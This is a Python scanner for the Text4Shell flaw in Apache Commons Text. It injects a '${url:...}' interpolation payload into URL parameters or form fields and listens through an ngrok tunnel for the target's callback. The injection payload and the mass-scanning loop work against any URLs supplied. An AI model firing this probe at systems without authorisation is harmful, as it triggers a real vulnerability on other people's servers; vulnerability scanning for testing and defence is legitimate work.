#!/usr/bin/env python

from bcolors import bcolors
from pyngrok import conf, ngrok
import argparse
import requests
import socket
import random
import re

form_regex="(?i)(<form.*?>.*?</form>)"
action_regex="(?i)(action=\")(.*?)(\")"
method_regex="(?i)(method=\")(.*?)(\")"
text_input_regex="(?i)(<input.*?type=\"text\".*?>)"

parser = argparse.ArgumentParser(
    description='Scan url for text4shell vulnerability')

group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-u', metavar='url', type=str, help='url to scan')
group.add_argument('-uf', metavar='url_file', type=str, help='file containing a list of urls seperated by newline')

parser.add_argument('-p', metavar='parameter', type=str, help='parameter to test')

args = parser.parse_args()


def setup():
    global payload
    global port

    port = random.randint(10000, 65535)

    print("Starting setup")

    payload = "${url:UTF-8:ENDPOINT}"

    print("Starting ngrok server")
    http_tunnel = ngrok.connect(port)

    print(f"Ngrok server started at {bcolors.okblue(http_tunnel.public_url)}")
    payload = payload.replace("ENDPOINT", http_tunnel.public_url + "/hello")

    main()


def main():
    if args.u != None:
        scan_url(args.u)
    elif args.uf != None:
        for line in open(args.uf):
            scan_url(line)
    else:
        raise Exception("Error: No url or file provided")


def scan_url(url):
    print(f"Scanning {bcolors.ok(url)}")

    if(args.p != None):

        print(f"Testing parameter {bcolors.ok(args.p)}")

        method = 'get'
        data = url + "?" + args.p + "=" + payload
        
        if listen_conn(method, data):
            print(f"parameter {bcolors.fail(args.p)} on {bcolors.fail(url)} is vulnerable")
        else:
            print(f"parameter {bcolors.ok(args.p)} on {bcolors.ok(url)} is not vulnerable")

    else:
        form = re.search(form_regex, str(requests.get(url).content)).group(0)

        if form:
            print(f"Form detected")

            action = re.findall(action_regex, form)
            method = re.findall(method_regex, form)
            text_inputs = re.findall(text_input_regex, form)

            options = ""

            for elm in text_inputs:
                name = re.search("(?i)(name=\")(.*?)(\")", elm).group(2)
                if(len(options) <= 0): options = f"?{name}=PAYLOAD"
                else: options += f"&{name}=PAYLOAD"

            options = options.replace("PAYLOAD", payload)

            method = 'get'
            data = None

            if len(method) > 0:
                if(method[0] == "POST"):
                    print(f"POST method detected")
                    data = f"{url}{action[0][1]}{options}"
                    method = 'post'

                elif(method[0] == "GET"):
                    print(f"GET method detected")
                    data = f"{url}{action[0][1]}{options}"

            else:
                print(f"Method not detected, assuming GET")
                data = f"{url}{action[0][1]}{options}"
        
            if listen_conn(method, data):
                print(f"{bcolors.fail(url)} is vulnerable to text4shell")
            else:
                print(f"{bcolors.ok(url)} is not vulnerable to text4shell")


def listen_conn(method, data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"Starting socket server on port {bcolors.okblue(str(port))}")
        s.settimeout(15.0)
        s.bind(('localhost', port))
        s.listen()

        if method == 'get':
            print(f"Sending request to {bcolors.ok(data)}")
            try:
                requests.get(data, timeout=0.0000000001)
            except requests.exceptions.ReadTimeout: 
                pass

        elif method == 'post':
            print(f"Sending request to {bcolors.ok(data)}")
            try:
                requests.post(data, timeout=0.0000000001)
            except requests.exceptions.ReadTimeout: 
                pass

        try:
            conn, addr = s.accept()
            with conn:
                data = conn.recv(1024)
                print(f"Connected by {addr} at endpoint {str(data).split(' ')[1]}")
                s.close()
                return True
        except socket.timeout:
            print("Socket timeout")
            s.close()
            return False


if __name__ == '__main__':
    try:
        setup()
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)
    except Exception as e:
        print(f"Error: {e}")
        exit(1)

